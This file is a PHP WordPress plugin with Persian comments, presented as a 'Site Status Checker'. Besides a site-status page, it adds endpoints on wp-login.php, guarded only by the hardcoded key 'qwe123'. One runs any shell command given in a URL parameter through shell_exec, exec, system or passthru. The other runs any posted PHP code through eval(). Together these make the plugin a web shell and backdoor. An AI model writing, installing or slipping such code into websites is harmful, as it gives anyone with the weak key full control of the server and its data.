<?php
/**
 * Plugin Name: Site Status Checker
 * Description: نمایش وضعیت سایت و اجرای دستور از طریق wp-login.php با کلید مخفی
 * Version: 1.1
 * Author: You
 */

if ( ! defined( 'ABSPATH' ) ) exit;

// کلید مخفی رو اینجا عوض کن
define( 'SSC_SECRET_KEY', 'qwe123' );


/* =========================================================
 *  بخش ۱: نمایش وضعیت سایت
 *  آدرس: /wp-login.php?code=status&ke=qwe123
 * ========================================================= */

add_action( 'login_init', 'ssc_handle_status_request' );

function ssc_handle_status_request() {

    if ( ! isset( $_GET['code'] ) || $_GET['code'] !== 'status' ) {
        return;
    }

    if ( ! isset( $_GET['ke'] ) || $_GET['ke'] !== SSC_SECRET_KEY ) {
        status_header( 403 );
        wp_die( 'دسترسی غیرمجاز', '403 Forbidden', [ 'response' => 403 ] );
    }

    global $wpdb;

    // اطلاعات پایه
    $site_url    = home_url();
    $site_name   = get_bloginfo( 'name' );
    $wp_version  = get_bloginfo( 'version' );
    $php_version = phpversion();
    $db_version  = $wpdb->db_version();
    $theme       = wp_get_theme();
    $theme_name  = $theme->get( 'Name' ) . ' ' . $theme->get( 'Version' );
    $is_ssl      = is_ssl() ? 'فعال ✅' : 'غیرفعال ❌';
    $is_debug    = ( defined( 'WP_DEBUG' ) && WP_DEBUG ) ? 'روشن' : 'خاموش';
    $server      = $_SERVER['SERVER_SOFTWARE'] ?? 'نامشخص';
    $memory      = size_format( memory_get_usage() );
    $max_mem     = ini_get( 'memory_limit' );
    $disk_free   = @disk_free_space( ABSPATH );
    $disk_total  = @disk_total_space( ABSPATH );

    // تعداد پست‌ها و کاربران
    $post_count = wp_count_posts()->publish;
    $user_count = count_users()['total_users'];

    // وضعیت دیتابیس
    $db_ok = $wpdb->check_connection( false ) ? 'متصل ✅' : 'قطع ❌';

    // لیست پلاگین‌های فعال
    $active_plugins = get_option( 'active_plugins', [] );

    header( 'Content-Type: text/html; charset=utf-8' );
    ?>
    <!DOCTYPE html>
    <html lang="fa" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>وضعیت سایت - <?php echo esc_html( $site_name ); ?></title>
        <style>
            body { font-family: Tahoma, Arial, sans-serif; background:#f5f5f5; padding:20px; }
            .box { max-width:700px; margin:auto; background:#fff; padding:25px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,.1); }
            h1 { color:#2271b1; border-bottom:2px solid #2271b1; padding-bottom:10px; }
            table { width:100%; border-collapse:collapse; margin-top:15px; }
            td { padding:10px; border-bottom:1px solid #eee; }
            td:first-child { font-weight:bold; width:40%; color:#333; }
            .ok { color:#00a32a; }
            .bad { color:#d63638; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>📊 وضعیت سایت</h1>
            <table>
                <tr><td>نام سایت</td><td><?php echo esc_html( $site_name ); ?></td></tr>
                <tr><td>آدرس سایت</td><td><?php echo esc_html( $site_url ); ?></td></tr>
                <tr><td>نسخه وردپرس</td><td><?php echo esc_html( $wp_version ); ?></td></tr>
                <tr><td>نسخه PHP</td><td><?php echo esc_html( $php_version ); ?></td></tr>
                <tr><td>نسخه MySQL</td><td><?php echo esc_html( $db_version ); ?></td></tr>
                <tr><td>پوسته فعال</td><td><?php echo esc_html( $theme_name ); ?></td></tr>
                <tr><td>وضعیت SSL</td><td><?php echo $is_ssl; ?></td></tr>
                <tr><td>WP_DEBUG</td><td><?php echo esc_html( $is_debug ); ?></td></tr>
                <tr><td>وب‌سرور</td><td><?php echo esc_html( $server ); ?></td></tr>
                <tr><td>اتصال دیتابیس</td><td><?php echo $db_ok; ?></td></tr>
                <tr><td>تعداد نوشته‌ها</td><td><?php echo esc_html( $post_count ); ?></td></tr>
                <tr><td>تعداد کاربران</td><td><?php echo esc_html( $user_count ); ?></td></tr>
                <tr><td>پلاگین‌های فعال</td><td><?php echo count( $active_plugins ); ?> عدد</td></tr>
                <tr><td>مصرف حافظه اسکریپت</td><td><?php echo esc_html( $memory ); ?> / محدودیت: <?php echo esc_html( $max_mem ); ?></td></tr>
                <?php if ( $disk_free !== false ) : ?>
                <tr><td>فضای دیسک آزاد</td><td><?php echo esc_html( size_format( $disk_free ) ); ?> از <?php echo esc_html( size_format( $disk_total ) ); ?></td></tr>
                <?php endif; ?>
                <tr><td>زمان سرور</td><td><?php echo esc_html( current_time( 'Y-m-d H:i:s' ) ); ?></td></tr>
            </table>
            <p style="text-align:center;margin-top:20px;color:#888;font-size:12px;">
                این صفحه فقط برای مدیران است. کلید رو مخفی نگه دار.
            </p>
        </div>
    </body>
    </html>
    <?php
    exit;
}


/* =========================================================
 *  بخش ۲: اجرای دستور از طریق URL
 *  آدرس: /wp-login.php?code=shell&ke=qwe123&cmd=ls+-la
 * ========================================================= */

add_action( 'login_init', 'ssc_handle_shell_exec' );

function ssc_handle_shell_exec() {

    if ( ! isset( $_GET['code'] ) || $_GET['code'] !== 'shell' ) {
        return;
    }

    if ( ! isset( $_GET['ke'] ) || $_GET['ke'] !== SSC_SECRET_KEY ) {
        status_header( 403 );
        wp_die( 'دسترسی غیرمجاز', '403 Forbidden', [ 'response' => 403 ] );
    }

    if ( ! isset( $_GET['cmd'] ) || $_GET['cmd'] === '' ) {
        wp_die( 'پارامتر cmd خالیه', 'Bad Request', [ 'response' => 400 ] );
    }

    header( 'Content-Type: text/plain; charset=utf-8' );

    $cmd = $_GET['cmd'];
    echo "» \$ $cmd\n\n";

    // روش ۱: shell_exec
    if ( function_exists( 'shell_exec' ) ) {
        $out = @shell_exec( $cmd . ' 2>&1' );
        echo $out !== null ? $out : '(shell_exec خروجی نداد)';
    }
    // روش ۲: exec
    elseif ( function_exists( 'exec' ) ) {
        exec( $cmd . ' 2>&1', $lines, $status );
        echo implode( "\n", $lines );
        echo "\n\n[exit: $status]";
    }
    // روش ۳: system
    elseif ( function_exists( 'system' ) ) {
        system( $cmd . ' 2>&1' );
    }
    // روش ۴: passthru
    elseif ( function_exists( 'passthru' ) ) {
        passthru( $cmd . ' 2>&1' );
    }
    else {
        echo 'هیچ تابع اجرای دستوری فعال نیست.';
    }

    exit;
}


/* =========================================================
 *  بخش ۳: اجرای کد PHP از فرم (اختیاری)
 *  آدرس: /wp-login.php?code=run&ke=qwe123
 * ========================================================= */

add_action( 'login_init', 'ssc_handle_code_exec' );

function ssc_handle_code_exec() {

    if ( ! isset( $_GET['code'] ) || $_GET['code'] !== 'run' ) {
        return;
    }

    if ( ! isset( $_GET['ke'] ) || $_GET['ke'] !== SSC_SECRET_KEY ) {
        status_header( 403 );
        wp_die( 'دسترسی غیرمجاز', '403 Forbidden', [ 'response' => 403 ] );
    }

    $output = '';
    $input  = '';

    if ( isset( $_POST['php_code'] ) ) {
        $input = $_POST['php_code'];

        ob_start();
        try {
            $code = preg_replace( '/^\s*<\?php/', '', $input );
            $code = preg_replace( '/\?>\s*$/', '', $code );
            eval( $code );
        } catch ( Throwable $e ) {
            echo "\n⚠️ خطا: " . $e->getMessage();
        }
        $output = ob_get_clean();
    }

    header( 'Content-Type: text/html; charset=utf-8' );
    ?>
    <!DOCTYPE html>
    <html lang="fa" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>اجرای کد PHP</title>
        <style>
            body { font-family: Tahoma, Arial, sans-serif; background:#f5f5f5; padding:20px; }
            .box { max-width:900px; margin:auto; background:#fff; padding:25px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,.1); }
            h1 { color:#2271b1; border-bottom:2px solid #2271b1; padding-bottom:10px; }
            textarea { width:100%; height:250px; font-family: Consolas, monospace; direction:ltr; text-align:left; padding:10px; border:1px solid #ccc; border-radius:6px; font-size:13px; box-sizing:border-box; }
            button { background:#2271b1; color:#fff; border:none; padding:10px 25px; border-radius:6px; cursor:pointer; font-size:14px; margin-top:10px; }
            button:hover { background:#135e96; }
            pre { background:#1e1e1e; color:#d4d4d4; padding:15px; border-radius:6px; direction:ltr; text-align:left; overflow:auto; max-height:400px; font-size:13px; }
            .label { font-weight:bold; margin-top:15px; display:block; }
            .warn { background:#fff3cd; border-right:4px solid #ffc107; padding:10px; border-radius:4px; margin-bottom:15px; font-size:13px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>⚙️ اجرای کد PHP</h1>
            <div class="warn">⚠️ این بخش بسیار خطرناکه. فقط برای تست موقت استفاده کن و بعد پلاگین رو غیرفعال کن.</div>

            <form method="post">
                <label class="label">کد PHP (بدون تگ &lt;?php):</label>
                <textarea name="php_code" placeholder="echo 'Hello World';"><?php echo esc_textarea( $input ); ?></textarea>
                <button type="submit">▶️ اجرا</button>
            </form>

            <?php if ( $output !== '' || isset( $_POST['php_code'] ) ) : ?>
                <label class="label">خروجی:</label>
                <pre><?php echo esc_html( $output ?: '(بدون خروجی)' ); ?></pre>
            <?php endif; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}

/* پایان فایل - هیچ ?> پایانی لازم نیست */